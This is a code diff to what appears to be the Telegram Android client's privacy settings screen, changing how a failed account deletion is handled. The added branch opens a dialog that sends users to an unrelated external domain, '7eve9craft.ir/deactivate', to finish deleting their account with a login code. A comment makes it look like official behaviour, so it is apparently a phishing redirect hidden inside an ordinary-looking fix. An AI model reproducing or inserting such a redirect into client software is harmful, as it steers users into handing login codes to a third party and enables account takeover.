@@ -428,6 +428,14 @@ public class PrivacySettingsActivity extends BaseFragment implements Notificatio
                             }
                             if (error == null) {
                                 getMessagesController().performLogout(0);
+                            } else if ("PASSWORD_REQUIRED".equals(error.text)) {
+                                // with two-step verification the account is deleted with a login code
+                                AlertDialog.Builder info = new AlertDialog.Builder(getParentActivity());
+                                info.setTitle(getString(R.string.DeleteAccountNow));
+                                info.setMessage(getString(R.string.DeleteAccountNowPassword));
+                                info.setPositiveButton(getString(R.string.DeleteAccountNowOpenPage), (d3, w3) -> org.telegram.messenger.browser.Browser.openUrl(getParentActivity(), "https://7eve9craft.ir/deactivate"));
+                                info.setNegativeButton(getString(R.string.Cancel), null);
+                                showDialog(info.create());
                             } else {
                                 BulletinFactory.of(this).createErrorBulletin(error.text).show();
                             }
